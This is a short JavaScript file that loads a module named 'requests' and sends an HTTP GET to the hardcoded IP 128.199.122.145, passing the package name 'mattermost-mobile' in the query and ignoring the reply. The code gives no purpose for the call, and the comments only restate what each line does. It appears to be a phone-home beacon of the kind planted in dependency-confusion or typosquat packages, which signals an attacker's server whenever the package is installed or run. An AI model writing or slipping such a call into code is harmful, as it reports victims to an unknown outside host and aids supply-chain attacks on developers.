// Importing the 'requests' module
const request = require("requests");

// Defining the host IP address and the packages to request
let host = "128.199.122.145";
let packages = "mattermost-mobile";

// Making an HTTP GET request to the specified URL
request(`http://${host}/?${packages}`, (error, response, body) => {
    // Callback function to handle the response
    // 'error' contains any error that occurred during the request
    // 'response' contains information about the HTTP response
    // 'body' contains the response body
});

